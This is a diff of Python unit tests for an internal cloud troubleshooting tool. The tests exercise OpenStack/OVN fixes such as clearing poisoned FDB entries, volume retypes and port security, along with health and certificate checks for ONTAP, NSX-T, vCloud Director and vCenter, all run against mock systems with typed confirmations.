         from modules.wi import catalog
@@ -681,10 +1115,26 @@ class FlowTest(unittest.TestCase):
         self.assertTrue(l1.get("/wi/api/session").get_json()["allowed"])
         self.assertEqual(l1.get("/ontap/api/session").get_json().get("allowed"), False)
 
+    def test_catalog_last_runs(self):
+        # the Last ran / Activity columns: the last 10 runs of each check on the selected site, newest first
+        from modules.wi import catalog as cat_mod, runs as runs_mod
+        check = cat_mod.get("ironic-nodes")
+        ids = [runs_mod.begin("demo-admin", "DCA", check, {}, "", "127.0.0.1") for _ in range(12)]
+        other = runs_mod.begin("demo-admin", "DCC", check, {}, "", "127.0.0.1")
+        c = self.client()
+        dca = {x["id"]: x for x in c.get("/wi/api/catalog?site=DCA").get_json()["checks"]}["ironic-nodes"]["runs"]
+        self.assertEqual([r["id"] for r in dca], ids[::-1][:10])
+        self.assertEqual(set(dca[0]), {"id", "ts", "status", "username", "summary"})
+        dcc = {x["id"]: x for x in c.get("/wi/api/catalog?site=DCC").get_json()["checks"]}["ironic-nodes"]["runs"]
+        self.assertEqual([r["id"] for r in dcc], [other])
+
     def test_catalog_access_per_site(self):
         c = self.client()
         data = c.get("/wi/api/catalog?site=DCA").get_json()
         by = {x["id"]: x for x in data["checks"]}
+        self.assertEqual(len(data["symptoms"]), len(__import__("modules.wi.catalog", fromlist=["CATALOG"]).CATALOG["symptoms"]))
+        self.assertEqual((by["cinder-pool-usage"]["fix"], by["sos-report"]["collect"]), (True, True))
+        self.assertTrue(by["cinder-pool-usage"]["does"].startswith("Finds full Cinder pools"))
         # one page per product in the left menu: every category has an icon, every check a product
         cats = {x["id"]: x for x in data["categories"]}
         self.assertTrue(all(x.get("icon") and x.get("summary") for x in cats.values()))
@@ -1424,6 +1874,250 @@ class FlowTest(unittest.TestCase):
         self.assertEqual(sorted(r["action"]["confirm"] for r in snaps), ["db-prod-data", "logs-old"])
         self.assertTrue(all(fixes_risk == "high" for fixes_risk in
                             [__import__("modules.wi.fixes", fromlist=["risk_of"]).risk_of(r["action"]) for r in snaps]))
+        # old volume type: one item per volume; a volume with snapshots is not ticked and deletes them right before its retype
+        item = self.run_check(osfix, "volume-type-legacy", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["snapshots"]["status"], "warn", st["snapshots"])
+        self.assertIn("1 volume(s) have snapshots (4 in total)", st["snapshots"]["detail"])
+        recs = item["result"]["recommendations"]
+        idx = next(i for i, x in enumerate(recs) if (x.get("action") or {}).get("label") == "Change the type of the ticked volumes"
+                   and any("db-prod-data" in it["label"] for it in x["action"]["select"]["items"]))
+        sel = recs[idx]["action"]["select"]["items"]
+        db = next(j for j, it in enumerate(sel) if it["label"].startswith("db-prod-data"))
+        self.assertFalse(sel[db]["default"])
+        self.assertIn("+ delete 4 snapshot(s)", sel[db]["label"])
+        self.assertRegex(sel[db]["commands"][0], r"^retype-volume 11111111-0000-4000-8000-000000000001 to fas500f-standard "
+                                                  r"timeout \d+ snapshots 55555555-0000-4000-8000-0000000000\d\d(,[0-9a-f-]{36}){3}$")
+        self.assertTrue(all(it["default"] for j, it in enumerate(sel) if j != db))
+        self.assertIn("openstack volume snapshot delete", " ".join(recs[idx]["commands"]))
+        r = osfix.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"selected": [db], "confirm": "x"})
+        self.assertEqual(r.status_code, 400, r.get_json())   # deletes snapshots: the number of volumes is typed
+        r = osfix.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"selected": [db], "confirm": "1 volumes"})
+        self.assertEqual(r.status_code, 200, r.get_json())
+        fix = self.wait_fix(osfix, r.get_json()["action_id"])
+        out = json.dumps(fix["output"])
+        self.assertEqual(fix["status"], "ok", out)
+        self.assertIn("has 4 approved snapshot(s): delete them first", out)
+        self.assertIn("db-prod-data has the type fas500f-standard", out)
+        # the operation alone: a snapshot that was not approved stops it before anything changes
+        import sys as _sys
+        _sys.path.insert(0, os.path.join(os.path.dirname(HERE), "modules", "wi", "wi_analysis"))
+        import wi_ops
+        lines, ran = [], []
+        vol = {"id": "11111111-0000-4000-8000-000000000003", "name": "archive-2024", "status": "available", "volume_type": "basic"}
+
+        def runner(argv, timeout):
+            ran.append(" ".join(argv))
+            if argv[:3] == ["openstack", "volume", "show"]:
+                return 0, json.dumps(vol)
+            if argv[:4] == ["openstack", "volume", "snapshot", "list"]:
+                return 0, json.dumps([{"ID": "99999999-0000-4000-8000-000000000001", "Name": "new", "Status": "available"}])
+            return 0, ""
+        rc = wi_ops.main(["retype-volume", vol["id"], "to", "fas500f-basic", "timeout", "60", "snapshots", "-"],
+                         wi_ops.Director(runner=runner, write=lines.append))
+        self.assertEqual(rc, wi_ops.FAILED, lines)
+        self.assertIn("not approved in the check (new)", lines[-1])
+        self.assertFalse([c for c in ran if c.startswith(("cinder retype", "openstack volume snapshot delete"))], ran)
+
+    def test_ovn_fdb_learning(self):
+        try:
+            self._ovn_fdb_learning()
+        finally:   # the fake cloud forgets the cleared FDB entries
+            if os.path.exists(os.path.join(TMP, "cloud-state.json")):
+                os.remove(os.path.join(TMP, "cloud-state.json"))
+
+    def _ovn_fdb_learning(self):
+        """WI "FDB Learning Issue" (Acme Flex, OVN): instances mdt01-04 on DataGrid-Network with port security disabled;
+        the MAC of the outside host 10.249.11.27 is recorded on the port of mdt01 and the MAC of mdt04 on the port of mdt02.
+        Several instance IDs (rows or pasted together), the poisoned entries found, cleared with a typed confirmation."""
+        import re
+        osfix = self.client("osfixer", "demo-operator-5")
+        mdt = [f"3d3d3d3d-0000-4000-8000-00000000000{n}" for n in (1, 2, 3, 4)]
+        # ---- the list of IDs: a wrong ID is refused, duplicates count once, at most 16
+        r = osfix.post("/wi/api/runs", json={"site": "DCA", "check": "ovn-fdb-learning", "params": {"instances": f"{mdt[0]},not-an-id"}})
+        self.assertEqual(r.status_code, 400, r.get_json())
+        self.assertIn("not-an-id is not an OpenStack UUID", r.get_json()["error"])
+        r = osfix.post("/wi/api/runs", json={"site": "DCA", "check": "ovn-fdb-learning",
+                                              "params": {"instances": ",".join(f"{i:08x}-0000-4000-8000-000000000000" for i in range(17))}})
+        self.assertIn("at most 16 IDs per run", r.get_json()["error"])
+        item = self.run_check(osfix, "ovn-fdb-learning", {"instances": f"{mdt[0]}\n{mdt[1]} {mdt[2]};{mdt[3]},{mdt[0]}",
+                                                          "dest_ip": "10.249.11.27", "capture_seconds": "5"})
+        self.assertEqual(item["status"], "fail", item.get("error") or item["result"])
+        self.assertEqual(item["params"]["instances"], ",".join(mdt))
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertIn("compute-07: mdt02, mdt04; compute-09: mdt01, mdt03", st["instances"]["detail"])
+        self.assertEqual((st["ports"]["status"], st["backend"]["status"], st["bindings"]["status"]), ("warn", "ok", "warn"))
+        self.assertIn("4 of 4 port(s) have port security DISABLED", st["ports"]["detail"])
+        self.assertIn("ovn-controller 23.09.4", st["backend"]["detail"])
+        self.assertIn(["DataGrid-Network", "00000000-0000-4000-8000-000000000002", "vlan", "1670", "225", "6", "4"],
+                      st["networks"]["table"]["rows"])
+        fdb = {row[1]: row for row in st["fdb"]["table"]["rows"]}
+        self.assertIn("2 poisoned entries", st["fdb"]["detail"])
+        self.assertTrue(fdb["10:70:fd:29:c7:fe"][4].startswith("POISONED: MAC of a host outside OpenStack, recorded on mdt01 port 7a7a7a7a"),
+                        fdb["10:70:fd:29:c7:fe"])
+        self.assertTrue(fdb["fa:16:3e:38:ae:44"][4].startswith("POISONED: MAC of mdt04 port 7a7a7a7a, recorded on mdt02"), fdb["fa:16:3e:38:ae:44"])
+        self.assertTrue(fdb["10:70:fd:29:c7:01"][4].startswith("ok (outside host"))
+        self.assertEqual(fdb["fa:16:3e:0b:cc:31"][4], "ok (its own MAC)")
+        self.assertIn(["mdt01", "tap7a7a7a7a-00", "2", "10:70:fd:29:c7:fe"], st["capture"]["table"]["rows"])
+        self.assertIn("81 FDB entr(ies) in 1 other network(s); 6 port(s)", st["audit"]["detail"])
+        recs = item["result"]["recommendations"]
+        idx = next(i for i, x in enumerate(recs) if (x.get("action") or {}).get("label") == "Clear the ticked FDB entries")
+        fx = item["fixes"][idx]
+        self.assertEqual((fx["risk"], len(fx["items"]), all(i["default"] for i in fx["items"])), ("high", 2, True))
+        self.assertTrue(fx["items"][0]["commands"][0].startswith("clear-fdb fdbfdbfd-0000-4000-8000-000000000001 dp 225 mac 1070fd29c7fe port 3 "
+                                                                 "node overcloud-novacompute-9=192.168.253.29 user "), fx["items"][0])
+        perm = next(x for x in recs if x["text"].startswith("Turn port security on"))
+        self.assertIn("openstack port set --enable-port-security --security-group port-security-allow-all 7a7a7a7a-0000-4000-8000-000000000001",
+                      " ".join(perm["commands"]))
+        # the reserved port without a device (the VIP of the HA pair) is a candidate, not given in the check
+        self.assertEqual(st["vips"]["status"], "warn", st["vips"])
+        self.assertIn(["DataGrid-Network", "mdt-vip", "10.249.11.50", "DOWN", "no"], st["vips"]["table"]["rows"])
+        self.assertIn("not in the check: 10.249.11.50", st["vips"]["detail"])
+        self.assertIn("VIP candidates not in the check: 10.249.11.50", perm["warning"])
+        trace = next(x for x in recs if x["text"].startswith("Confirm with a trace"))
+        self.assertIn("in_port=tap7a7a7a7a-00,dl_src=fa:16:3e:0b:cc:31,dl_dst=10:70:fd:29:c7:fe,icmp,nw_src=10.249.11.39,nw_dst=10.249.11.27",
+                      " ".join(trace["commands"]))
+        # ---- the fix: a typed confirmation, each entry read again on the node, destroyed, read once more
+        r = osfix.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"selected": [0, 1], "confirm": "wrong"})
+        self.assertEqual(r.status_code, 400, r.get_json())
+        expected = re.search(r"type (.+?) to confirm", r.get_json()["error"]).group(1)
+        r = osfix.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"selected": [0, 1], "confirm": expected})
+        fix = self.wait_fix(osfix, r.get_json()["action_id"])
+        self.assertEqual(fix["status"], "ok", fix)
+        self.assertIn("FDB entry 10:70:fd:29:c7:fe (port key 3) removed from datapath 225", json.dumps(fix["output"]))
+        again = self.wait_run(osfix, fix["verify_run_id"])
+        st2 = {s["key"]: s for s in again["result"]["steps"]}
+        self.assertEqual(st2["fdb"]["status"], "ok", st2["fdb"])
+        self.assertEqual(again["status"], "warn")   # the ports still have port security disabled
+        # ---- the permanent fix: port security on, port by port, with the allow-all group and the VIP of the check
+        r = osfix.post("/wi/api/runs", json={"site": "DCA", "check": "ovn-fdb-learning",
+                                              "params": {"instances": ",".join(mdt), "vips": "10.249.11.50, 999.1.1.1"}})
+        self.assertIn("999.1.1.1 is not an IP address or network", r.get_json()["error"])
+        item = self.run_check(osfix, "ovn-fdb-learning", {"instances": ",".join(mdt), "vips": "10.249.11.50 10.249.11.50/32"})
+        self.assertEqual(item["params"]["vips"], "10.249.11.50")   # once: /32 is the same address
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["vips"]["status"], "ok", st["vips"])
+        recs = item["result"]["recommendations"]
+        idx = next(i for i, x in enumerate(recs) if (x.get("action") or {}).get("label") == "Turn port security on for the ticked ports")
+        fx = item["fixes"][idx]
+        self.assertEqual((fx["risk"], len(fx["items"]), fx["available"]), ("high", 4, True), fx)
+        self.assertEqual(fx["items"][0]["commands"][0],
+                         "port-security 7a7a7a7a-0000-4000-8000-000000000001 project c0ffee00000000000000000000000001 sg "
+                         "port-security-allow-all allow 10.249.11.50 dp 225 pkey 3 node "
+                         "overcloud-novacompute-9=192.168.253.29 user " + fx["items"][0]["commands"][0].rsplit(" ", 1)[1])
+        self.assertIn("--allowed-address ip-address=10.249.11.50 ", " ".join(recs[idx]["commands"]))
+        r = osfix.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"selected": [0, 1], "confirm": "2"})
+        self.assertEqual(r.status_code, 400, r.get_json())
+        expected = re.search(r"type (.+?) to confirm", r.get_json()["error"]).group(1)
+        self.assertEqual(expected, "2 ports")
+        r = osfix.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"selected": [0, 1], "confirm": expected})
+        self.assertEqual(r.status_code, 200, r.get_json())
+        fix = self.wait_fix(osfix, r.get_json()["action_id"])
+        out = json.dumps(fix["output"])
+        self.assertEqual(fix["status"], "ok", out)
+        self.assertIn("port security on (security group port-security-allow-all, allowed addresses 10.249.11.50)", out)
+        self.assertIn("Security group port-security-allow-all exists already", out)   # the second port reuses the group
+        self.assertIn("--remote-ip ::/0 5e5e5e5e-0000-4000-8000-000000000001   (exists already)", out)
+        self.assertNotIn("(exit 1)", out)
+        self.assertIn("1 FDB entry cleared", out)   # mdt01: its own MAC, learned while its port accepted any MAC
+        again = self.wait_run(osfix, fix["verify_run_id"])
+        st2 = {s["key"]: s for s in again["result"]["steps"]}
+        self.assertIn("2 of 4 port(s) have port security DISABLED", st2["ports"]["detail"])
+        self.assertIn(["mdt01", "7a7a7a7a-0000-4000-8000-000000000001", "fa:16:3e:0b:cc:31", "10.249.11.39", "enabled", "1",
+                       "10.249.11.50", "overcloud-novacompute-9.localdomain"], st2["ports"]["table"]["rows"])
+        # the compute of the first instance does not answer over SSH: the Southbound DB is read from the next node
+        state_file = os.path.join(TMP, "cloud-state.json")
+        with open(state_file) as f:
+            cloud = json.load(f)
+        with open(state_file, "w") as f:
+            json.dump(dict(cloud, ssh_down=["overcloud-novacompute-9"]), f)
+        item = self.run_check(osfix, "ovn-fdb-learning", {"instances": ",".join(mdt)})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["ovn"]["status"], "warn", st["ovn"])
+        self.assertIn("Read from overcloud-novacompute-7 (192.168.253.27). Did not answer: overcloud-novacompute-9 (192.168.253.29): ",
+                      st["ovn"]["detail"])
+        self.assertIn("Connection timed out", st["ovn"]["detail"])
+        self.assertEqual(st["fdb"]["status"], "ok", st["fdb"])
+        fx = next(f for f in item["fixes"] if f and f.get("label") == "Turn port security on for the ticked ports")
+        self.assertIn("node overcloud-novacompute-7=192.168.253.27 ", fx["items"][0]["commands"][0])
+        # no node answers: the check says so, and offers no port security fix
+        with open(state_file, "w") as f:
+            json.dump(dict(cloud, ssh_down=[n for n, _ip in __import__("tests.fake_cloud", fromlist=["UC_NODES"]).UC_NODES]), f)
+        item = self.run_check(osfix, "ovn-fdb-learning", {"instances": ",".join(mdt)})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["ovn"]["status"], "fail", st["ovn"])
+        self.assertIn("No overcloud node answered over SSH from the director", st["ovn"]["detail"])
+        self.assertFalse([f for f in item["fixes"] if f and f.get("label") == "Turn port security on for the ticked ports"])
+        with open(state_file, "w") as f:
+            json.dump(cloud, f)
+        # ---- the operation itself: an entry that changed is left alone, one already gone is done
+        sys.path.insert(0, os.path.join(os.path.dirname(HERE), "modules", "wi", "wi_analysis"))
+        import wi_ops
+        answers = {"list": (0, json.dumps({"headings": ["mac", "dp_key", "port_key"], "data": [["fa:16:3e:99:99:99", 225, 3]]}))}
+        ran = []
+
+        def runner(argv, timeout):
+            ran.append(argv[-1])
+            return answers["list"] if " list fdb " in argv[-1] else (0, "")
+        lines = []
+        args = ["clear-fdb", "fdbfdbfd-0000-4000-8000-000000000001", "dp", "225", "mac", "1070fd29c7fe", "port", "3",
+                "node", "overcloud-novacompute-9=192.168.253.29", "user", "tripleo-admin"]
+        rc = wi_ops.main(args, wi_ops.Director(runner=runner, write=lines.append))
+        self.assertEqual(rc, wi_ops.FAILED, lines)
+        self.assertFalse(any("destroy" in c for c in ran), ran)
+        answers["list"] = (1, 'ovn-sbctl: no row "fdbfdbfd-0000-4000-8000-000000000001" in table FDB')
+        self.assertEqual(wi_ops.main(args, wi_ops.Director(runner=runner, write=lines.append)), wi_ops.OK)
+        self.assertIn("already gone", lines[-1])
+        # port security: a port of another project now is left alone; a wrong address is refused before anything runs
+        ran.clear()
+        port = {"id": "7a7a7a7a-0000-4000-8000-000000000001", "project_id": "c0ffee00000000000000000000000002",
+                "port_security_enabled": False, "allowed_address_pairs": []}
+        ps = ["port-security", port["id"], "project", "c0ffee00000000000000000000000001", "sg", "port-security-allow-all",
+              "allow", "10.249.11.50", "dp", "225", "pkey", "3", "node", "overcloud-novacompute-9=192.168.253.29", "user", "tripleo-admin"]
+        rc = wi_ops.main(ps, wi_ops.Director(runner=lambda argv, t: (ran.append(" ".join(argv)), (0, json.dumps(port)))[1],
+                                             write=lines.append))
+        self.assertEqual(rc, wi_ops.FAILED, lines[-1])
+        self.assertIn("belongs to project c0ffee00000000000000000000000002 now", lines[-1])
+        self.assertEqual(ran, [f"openstack port show {port['id']} -f json"])
+        bad = ps[:7] + ["10.10.11.500"] + ps[8:]
+        self.assertEqual(wi_ops.main(bad, wi_ops.Director(runner=runner, write=lines.append)), wi_ops.ATTENTION)
+        self.assertIn("refused: invalid address", lines[-1])
+        # port security on already: straight to OVN; what OVN answers is told apart (not readable / still "unknown")
+        on = dict(port, project_id="c0ffee00000000000000000000000001", port_security_enabled=True,
+                  security_group_ids=["5e5e5e5e-0000-4000-8000-000000000001"],
+                  allowed_address_pairs=[{"ip_address": "10.249.11.50", "mac_address": "fa:16:3e:0b:cc:31"}])
+        binding = {"answer": (1, "sudo: a password is required")}
+
+        def ovn_runner(argv, timeout):
+            cmd = " ".join(argv)
+            if cmd.startswith("openstack port show"):
+                return 0, json.dumps(on)
+            if cmd.startswith("openstack security group list"):
+                return 0, json.dumps([{"ID": "5e5e5e5e-0000-4000-8000-000000000001", "Name": "port-security-allow-all"}])
+            if "find port_binding" in cmd:
+                self.assertIn("sudo -n podman exec ovn_controller ovn-sbctl", cmd)
+                return binding["answer"]
+            return 0, ""
+        lines, ran = [], []
+
+        def logged(argv, t):
+            ran.append(" ".join(argv))
+            return ovn_runner(argv, t)
+        # OVN not readable before the change (e.g. the director cannot reach the node over SSH): nothing is changed
+        self.assertEqual(wi_ops.main(ps, wi_ops.Director(runner=logged, sleep=lambda s: None, write=lines.append)), wi_ops.ATTENTION)
+        self.assertIn("cannot be read on overcloud-novacompute-9 (sudo: a password is required): nothing was changed", lines[-1])
+        self.assertFalse([c for c in ran if c.startswith(("openstack port set", "openstack security group"))], ran)
+        binding["answer"] = (0, json.dumps({"headings": ["mac"], "data": [[["set", ["fa:16:3e:0b:cc:31 10.249.11.39", "unknown"]]]]}))
+        self.assertEqual(wi_ops.main(ps, wi_ops.Director(runner=ovn_runner, sleep=lambda s: None, write=lines.append)), wi_ops.ATTENTION)
+        self.assertIn('still has the address "unknown" after 30 s (mac: fa:16:3e:0b:cc:31 10.249.11.39, unknown)', lines[-1])
+        binding["answer"] = (0, json.dumps({"headings": ["mac"], "data": [["fa:16:3e:0b:cc:31 10.249.11.39"]]}))
+        self.assertEqual(wi_ops.main(ps, wi_ops.Director(runner=ovn_runner, sleep=lambda s: None, write=lines.append)), wi_ops.OK)
+        self.assertIn("  mac: fa:16:3e:0b:cc:31 10.249.11.39", lines)
+        # reads of the check: fixed commands, validated arguments
+        from wi_analysis import overcloud as oc
+        for bad in ("ovn_fdb:22a", "ovn_capture:tapx:10:fa163e0bcc31", "ovn_dp:abc", "ovn_capture:tap7a7a7a7a-00:99:fa163e0bcc31"):
+            with self.assertRaises(ValueError):
+                oc.parse(f"n|192.168.253.29|tripleo-admin|{bad}")
 
     def test_operations(self):
         try:
@@ -1622,6 +2316,297 @@ class FlowTest(unittest.TestCase):
             self.assertEqual(admin.delete(f"/wi/api/hosts/{hid}").status_code, 200, name)
         for cid in (lb_cred, node_cred):
             admin.delete(f"/wi/api/credentials/{cid}")
+
+    def test_control_plane(self):
+        """OVN RAFT databases, RabbitMQ queues and Galera on the controllers (RISET-KNOWN-ISSUES 2.1 / 2.2)."""
+        c = self.client()
+        item = self.run_check(c, "ovn-db-cluster", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["model"]["status"], "ok", st["model"])
+        self.assertIn("Clustered (RAFT)", st["model"]["detail"])
+        self.assertEqual(st["nbraft"]["status"], "ok", st["nbraft"])
+        self.assertIn("Leader: overcloud-controller-0; term 3; members per node: 3", st["nbraft"]["detail"])
+        self.assertEqual(st["sbraft"]["status"], "warn", st["sbraft"])   # a removed controller is still a member
+        self.assertIn("More members than controllers", st["sbraft"]["detail"])
+        self.assertEqual(st["northd"]["status"], "ok")
+        self.assertIn("Active on overcloud-controller-0", st["northd"]["detail"])
+        self.assertEqual(st["size"]["status"], "warn")
+        self.assertIn("MAC_Binding: 152,340 row(s); the biggest database file: 700 MB", st["size"]["detail"])
+        self.assertTrue(any(r.get("references") for r in item["result"]["recommendations"]))
+        item = self.run_check(c, "rabbitmq-queues", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual((st["fd"]["status"], st["queues"]["status"]), ("warn", "warn"), st)
+        self.assertIn("overcloud-controller-0 fd 93%", st["fd"]["detail"])
+        self.assertIn("6 queue(s); 3 with 1000 messages or more", st["queues"]["detail"])
+        purge = next(r for r in item["result"]["recommendations"] if r["text"].startswith("Notification queues"))
+        self.assertEqual(len(purge["commands"]), 2)   # notifications.* only, never the fanout queue
+        self.assertNotIn("fanout", " ".join(purge["commands"]))
+        item = self.run_check(c, "galera-wsrep", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["wsrep"]["status"], "warn", st["wsrep"])
+        self.assertIn("overcloud-controller-2", st["wsrep"]["detail"])
+        self.assertIn(["overcloud-controller-2", "3", "Primary", "Synced", "ON", "0.25", "4.5", "3100 now, 3900 peak of 4096 (95%)"],
+                      st["wsrep"]["table"]["rows"])
+
+    def test_ontap_health(self):
+        """ONTAP volumes / LUNs and HA / redundancy (RISET-KNOWN-ISSUES 2.5), with the read-only ONTAP account."""
+        c = self.client()
+        test = c.post("/api/admin/credentials/ontap:DCA", json={"username": ONTAP_RO[0], "password": ONTAP_RO[1]}).get_json()["test"]
+        self.assertTrue(test["ok"], test)
+        self.addCleanup(c.delete, "/api/admin/credentials/ontap:DCA")
+        item = self.run_check(c, "ontap-volume-lun-state", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["volumes"]["status"], "ok", st["volumes"])
+        self.assertEqual(st["luns"]["status"], "fail", st["luns"])
+        self.assertIn("1 in space_error", st["luns"]["detail"])
+        self.assertEqual(st["autosize"]["status"], "warn", st["autosize"])
+        self.assertTrue(any(r[0].endswith("_CINDER_15_vol") for r in st["autosize"]["table"]["rows"]))
+        self.assertEqual(st["inodes"]["status"], "fail", st["inodes"])   # CINDER_16 at 92%
+        self.assertEqual(st["svms"]["status"], "ok", st["svms"])        # the stopped DR destination is not counted
+        recs = item["result"]["recommendations"]
+        self.assertIn("lun online -vserver", " ".join(c2 for r in recs for c2 in r["commands"]))
+        self.assertTrue(all(ref["vendor"] == "NetApp" for r in recs for ref in r.get("references") or []))
+        item = self.run_check(c, "ontap-ha-redundancy", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["ha"]["status"], "fail", st["ha"])
+        self.assertIn("DCASTNCL-04", st["ha"]["detail"])
+        self.assertEqual((st["spares"]["status"], st["ports"]["status"], st["ntp"]["status"]), ("warn", "warn", "warn"), st)
+        self.assertIn("No spare disk on: DCASTNCL-04", st["spares"]["detail"])
+        self.assertIn(["DCASTNCL-03", "0", "2"], st["spares"]["table"]["rows"])   # spare partitions only (ADP): not "no spare"
+        self.assertEqual(st["ports"]["table"]["rows"],   # the interface group lost a member; unused e0f down is not rated
+                         [["DCASTNCL-02", "a0a", "interface group", "-", "1 of 2 member port(s) active; not active: e0c"]])
+        self.assertIn("8 unused port(s) are down", st["ports"]["detail"])   # e0d and e0f of each node
+        self.assertIn("1 NTP server(s)", st["ntp"]["detail"])
+        self.assertIn("DCASTNCL-03 +12", st["ntp"]["detail"])   # 120 s ahead (a few seconds of the run itself)
+
+    def test_prime_platform(self):
+        """NSX-T gateways and BGP, the vCloud Director platform, the vCenter appliance (RISET-KNOWN-ISSUES 2.6-2.8)."""
+        c = self.client()
+        account = {"username": mock_vmware.READONLY_USER, "password": mock_vmware.READONLY_PASSWORD}
+        for name in ("ro-nsxt:DCA", "ro-vcenter:DCA"):
+            self.assertTrue(c.post(f"/api/admin/credentials/{name}", json=account).get_json()["test"]["ok"], name)
+            self.addCleanup(c.delete, f"/api/admin/credentials/{name}")
+        r = c.post("/api/admin/credentials/ro-vcd", json={**account, "address": f"https://127.0.0.1:{VMWARE.port}/"})
+        self.assertTrue(r.get_json()["test"]["ok"], r.get_json())
+        self.addCleanup(c.delete, "/api/admin/credentials/ro-vcd")
+        item = self.run_check(c, "nsxt-gateway-routing", {"tier1": "t1-cust-a"})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["gateways"]["status"], "fail", st["gateways"])   # the Tier-1 has two ACTIVE: split brain
+        self.assertIn("Tier-1 t1-cust-a", st["gateways"]["detail"])
+        self.assertNotIn("T0-DCA", st["gateways"]["detail"])
+        self.assertEqual(st["bgp"]["status"], "fail", st["bgp"])
+        self.assertIn("Not ESTABLISHED: T0-DCA → 10.240.0.2", st["bgp"]["detail"])
+        self.assertIn("T0-DCA → 10.240.0.1", st["bgp"]["detail"])            # up for 20 minutes: flapped
+        self.assertEqual(st["clusters"]["status"], "ok")
+        self.assertTrue(any("425005" in ref["url"] for rec in item["result"]["recommendations"] for ref in rec.get("references") or []))
+        item = self.run_check(c, "vcd-platform", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["cells"]["status"], "fail", st["cells"])
+        self.assertIn("Inactive: vcd-cell-03-old", st["cells"]["detail"])
+        self.assertIn("10.248.0.12", st["cells"]["detail"])
+        self.assertEqual((st["vcenters"]["status"], st["edges"]["status"], st["nets"]["status"]), ("ok", "fail", "ok"), st)
+        self.assertEqual(st["edges"]["table"]["rows"], [["CUST-B-EDGE", "cust-b", "REALIZATION_FAILED"]])
+        item = self.run_check(c, "vcenter-appliance", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual((st["health"]["status"], st["services"]["status"], st["backup"]["status"]), ("warn", "fail", "fail"), st)
+        self.assertIn("system yellow, storage yellow", st["health"]["detail"])
+        self.assertIn("Not running: vmware-sps", st["services"]["detail"])
+        self.assertIn("Last job failed", st["backup"]["detail"])
+
+    def test_cert_inventory(self):
+        """Internal certificates of vCenter, the ESXi hosts, NSX-T, vCloud Director and ONTAP (RISET-KNOWN-ISSUES 2.5-2.8)."""
+        c = self.client()
+        item = self.run_check(c, "cert-inventory", {})   # no account yet: every store is skipped, nothing fails
+        self.assertEqual(item["result"]["status"], "skip", item["result"]["summary"])
+        overview = {s["key"]: s for s in item["result"]["steps"]}["overview"]
+        self.assertTrue(all(r[4] == "NOT READ" for r in overview["table"]["rows"]), overview)
+        account = {"username": mock_vmware.READONLY_USER, "password": mock_vmware.READONLY_PASSWORD}
+        for name in ("ro-nsxt:DCA", "ro-vcenter:DCA"):
+            self.assertTrue(c.post(f"/api/admin/credentials/{name}", json=account).get_json()["test"]["ok"], name)
+            self.addCleanup(c.delete, f"/api/admin/credentials/{name}")
+        r = c.post("/api/admin/credentials/ro-vcd", json={**account, "address": f"https://127.0.0.1:{VMWARE.port}/"})
+        self.assertTrue(r.get_json()["test"]["ok"], r.get_json())
+        self.addCleanup(c.delete, "/api/admin/credentials/ro-vcd")
+        test = c.post("/api/admin/credentials/ontap:DCA", json={"username": ONTAP_RO[0], "password": ONTAP_RO[1]}).get_json()["test"]
+        self.assertTrue(test["ok"], test)
+        self.addCleanup(c.delete, "/api/admin/credentials/ontap:DCA")
+        item = self.run_check(c, "cert-inventory", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual([r[4] for r in st["overview"]["table"]["rows"]],
+                         ["WARN", "WARN", "FAIL", "FAIL", "WARN", "WARN", "FAIL"], st["overview"])
+        self.assertEqual(st["overview"]["table"]["columns"][-1], "Status")   # every system read: no column Note
+        self.assertEqual(st["sts"]["status"], "warn", st["sts"])   # 120 days: under the 180 days of KB 318968
+        self.assertIn("120 day(s) left", st["sts"]["detail"])
+        self.assertIn("EXPIRED", [r[5] for r in st["sts"]["table"]["rows"]])   # an old chain, validation only
+        self.assertEqual(st["vctrust"]["status"], "warn", st["vctrust"])   # the CA that issued Machine SSL: 20 days
+        roots = {r[0]: r for r in st["vctrust"]["table"]["rows"]}
+        self.assertEqual(roots["Trusted root (issued Machine SSL)"][4:], [20, "WARN"])
+        self.assertEqual(roots["Machine SSL (vCenter on port 443)"][4:], [400, "OK"])
+        self.assertIn("1 expired and not in use", st["vctrust"]["detail"])
+        self.assertIn("Machine SSL: 400 day(s) left; the CA that issued it: 20 day(s)", st["vctrust"]["detail"])
+        self.assertEqual(st["esxi"]["status"], "fail", st["esxi"])   # esxi-dca-03: 5 days, expirationImminent
+        hosts = {r[0]: r for r in st["esxi"]["table"]["rows"]}
+        self.assertEqual(hosts["esxi-dca-03"][5:], [5, "expirationImminent", "FAIL"])
+        self.assertEqual(hosts["esxi-dca-02"][5:], [20, "expiringShortly", "WARN"])
+        self.assertTrue(hosts["esxi-dca-05"][7].startswith("NOT READ"))
+        self.assertEqual(st["nsx"]["status"], "fail", st["nsx"])   # the APH certificate in use: 5 days
+        nsx = {r[0]: r for r in st["nsx"]["table"]["rows"]}
+        self.assertEqual(nsx["APH-AR-nsx-mgr-dca-01"][4:], [5, "APH on 2 node(s)", "FAIL"])
+        self.assertEqual(nsx["LM-dca"][4:], [25, "LOCAL_MANAGER on 1 node(s)", "WARN"])   # from its PEM (no details)
+        self.assertEqual(nsx["imported-2023"][6], "EXPIRED (not in use)")
